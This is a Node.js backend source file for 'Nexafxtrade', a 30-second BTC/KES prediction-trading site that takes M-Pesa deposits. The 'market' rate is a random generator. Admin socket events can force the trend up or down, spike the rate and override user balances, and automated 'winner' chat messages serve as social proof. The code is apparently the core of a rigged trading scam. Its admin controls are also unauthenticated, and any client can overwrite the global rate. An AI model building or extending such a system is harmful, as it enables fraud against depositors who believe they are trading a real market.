/**
 * Nexafxtrade Backend Engine
 * Version: 3.2.0 (May 2026)
 * Brand: Nexafxtrade (formerly Nexapaytrade)
 */

const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");
const http = require("http");
const { Server } = require("socket.io");

// Load environment variables
dotenv.config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*", 
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());

// Global Market State
let currentMarketRate = 8421500; // Updated to match your default KES base rate sequence
let forcedAdminTrend = "AUTO";   // Tracks admin panel chart manipulation parameters

// Main brand identification
app.get("/", (req, res) => {
  res.send("Nexafxtrade | High-Performance Trading Engine Running");
});

// Database Connection
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("MongoDB Connected Successfully"))
  .catch(err => console.log("MongoDB Connection Error:", err));

// Route Imports
const authRoutes = require("./routes/authRoutes");
const paymentRoutes = require("./routes/paymentRoutes"); 
const userRoutes = require("./routes/User"); // Added User routes for profile management

// Use Routes
app.use("/api/auth", authRoutes);
app.use("/api/payments", paymentRoutes);
app.use("/api/user", userRoutes);

/**
 * REAL-TIME ENGINE (Socket.io)
 * Handles live charts, social proof chat, and the 30-second trade loop
 */
io.on("connection", (socket) => {
  console.log("New Trader Connected to Nexafxtrade");

  // Sync current administration configuration parameters with new incoming pipelines
  socket.emit('admin-force-market-trend', { trend: forcedAdminTrend });
  socket.emit('market-update', { rate: currentMarketRate });

  // 1. CHAT & SOCIAL PROOF
  socket.on("send-chat", (data) => {
    io.emit("receive-chat", {
      user: data.user,
      message: data.message,
      time: new Date().toLocaleTimeString()
    });
  });

  // 2. ADMIN PANEL INTERCEPT CONTROL HOOKS
  
  // Receives direct dashboard manual inputs for Gateway Base Rate and applies them globally
  socket.on("admin-force-gateway-rate", (data) => {
    if (data && typeof data.rate === 'number') {
      currentMarketRate = Math.floor(data.rate);
      console.log(`CRITICAL: Admin updated Gateway Base Rate to BTC/KES ${currentMarketRate}`);
      
      io.emit("market-update", { 
        rate: currentMarketRate,
        timestamp: data.timestamp || new Date().toISOString()
      });
    }
  });

  // Captures multi-parameter configuration payload sync matrix from Admin Panel
  socket.on("admin-matrix-sync", (data) => {
    if (data && data.marketTrend) {
      forcedAdminTrend = data.marketTrend;
      console.log(`System Configuration Synced. Market Trend Overridden to: ${forcedAdminTrend}`);
      io.emit("admin-force-market-trend", { trend: forcedAdminTrend });
      
      if (data.customSpikeRate !== '' && !isNaN(data.customSpikeRate)) {
        currentMarketRate += parseFloat(data.customSpikeRate);
        io.emit("market-update", { rate: currentMarketRate });
      }
    }
  });

  // Listens for direct trend adjustment tags pushed from Admin panel control hub buttons
  socket.on("admin-force-market-trend", (data) => {
    if (data && data.trend) {
      forcedAdminTrend = data.trend;
      io.emit("admin-force-market-trend", { trend: forcedAdminTrend });
      console.log(`Admin override deployed. Active market trend set to: ${forcedAdminTrend}`);
    }
  });

  // Backward compatible hook: Listens to old trend override endpoint structure 
  socket.on("admin-control-trend", (data) => {
    if (data && data.trend) {
      forcedAdminTrend = data.trend;
      io.emit("admin-force-market-trend", { trend: forcedAdminTrend });
      console.log(`Admin override deployed (via admin-control-trend endpoint): ${forcedAdminTrend}`);
    }
  });

  // Forces direct manual balance modification down targeted socket nodes or text handles
  socket.on("admin-force-balance", (data) => {
    if (data && data.user && typeof data.balance === 'number') {
      console.log(`Balance Override processing for account ${data.user} to KES ${data.balance}`);
      io.emit("admin-force-balance", { 
        user: data.user, 
        balance: data.balance,
        timestamp: data.timestamp || new Date().toISOString()
      });
    }
  });

  // Fallback structural compatibility endpoint for target socket node adjustments
  socket.on("admin-control-balance", (data) => {
    if (data && data.targetSocketId && typeof data.balance === 'number') {
      io.to(data.targetSocketId).emit("admin-force-balance", { balance: data.balance });
    }
  });

  // Emits manual emergency global alert notifications to all active window views
  socket.on("admin-global-broadcast", (data) => {
    if (data && data.msg) {
      console.log(`System broadcast notification dispatched: "${data.msg}"`);
      io.emit("admin-global-broadcast", { 
        msg: data.msg,
        expiry: data.expiry || 300
      });
    }
  });

  // Fallback compatibility for general administrative global notifications
  socket.on("admin-control-broadcast", (data) => {
    if (data && data.msg) {
      io.emit("admin-global-broadcast", { msg: data.msg });
    }
  });

  // Tracks updates cascading upwards from front-end layout executions
  socket.on("market-update", (data) => {
    if (data && typeof data.rate === 'number') {
      currentMarketRate = data.rate;
    }
  });

  // 3. TRADE EXECUTION ENGINE (The "Prediction" Loop)
  socket.on("place-trade", (data) => {
    const entryPrice = currentMarketRate;
    const amount = parseFloat(data.amount);
    
    console.log(`Trade: ${data.type} KES ${amount} at ${entryPrice}`);

    // Standard 30-second window to match buysell254 style
    setTimeout(() => {
      const exitPrice = currentMarketRate;
      let win = false;

      if (data.type === 'BUY' && exitPrice > entryPrice) win = true;
      if (data.type === 'SELL' && exitPrice < entryPrice) win = true;

      const payout = win ? (amount * 1.85) : 0; // 85% Profit for Kenyan market

      socket.emit("trade-result", {
        status: win ? "WIN" : "LOSS",
        payout: payout.toFixed(2),
        entry: entryPrice,
        exit: exitPrice
      });

      // Broadcast a "Winner Notification" to Chat for Social Proof
      if (win && amount >= 500) {
        io.emit("receive-chat", {
          user: "System",
          message: `🎉 User ***${socket.id.substring(0,3)} just won KES ${payout.toFixed(0)}!`
        });
      }
    }, 30000); 
  });

  socket.on("disconnect", () => {
    console.log("Trader disconnected");
  });
});

/**
 * MARKET RATE GENERATOR (Wavy Movement Simulation Matrix)
 */
setInterval(() => {
  if (forcedAdminTrend === "AUTO") {
    const dynamicShift = (Math.random() - 0.48) * (8000 / 15);
    currentMarketRate = Math.floor(currentMarketRate + dynamicShift);
  } else if (forcedAdminTrend === "HIGH") {
    const dynamicShift = (Math.random() * (45000 / 15)) + 1800;
    currentMarketRate = Math.floor(currentMarketRate + dynamicShift);
  } else if (forcedAdminTrend === "LOW") {
    const dynamicShift = -((Math.random() * (45000 / 15)) + 1800);
    currentMarketRate = Math.floor(currentMarketRate + dynamicShift);
  }
  
  io.emit("market-update", { rate: currentMarketRate });
}, 1000);

/**
 * MPESA CALLBACK HANDLING
 */
app.post("/api/mpesa/callback", async (req, res) => {
    const callbackData = req.body.Body.stkCallback;

    if (callbackData.ResultCode === 0) {
        const metadata = callbackData.CallbackMetadata.Item;
        const amount = metadata.find(item => item.Name === 'Amount').Value;
        const phone = metadata.find(item => item.Name === 'PhoneNumber').Value;
        
        console.log(`Nexafxtrade Deposit: KSh ${amount} confirmed for ${phone}`);
        
        // Referral Logic: 10% Bonus
        const bonus = amount * 0.10;
        // User balance and Referral bonus update logic handled here
    } 
    res.status(200).send("OK");
});

/**
 * FALLBACK RATE API
 */
app.get("/api/market/rate", (req, res) => {
    res.json({ rate: currentMarketRate });
});

// Port Logic
const PORT = process.env.PORT || 5000;

server.listen(PORT, () => {
  console.log(`Nexafxtrade Live at: http://localhost:${PORT}`);
  console.log(`M-Pesa Webhook Active: /api/mpesa/callback`);
});
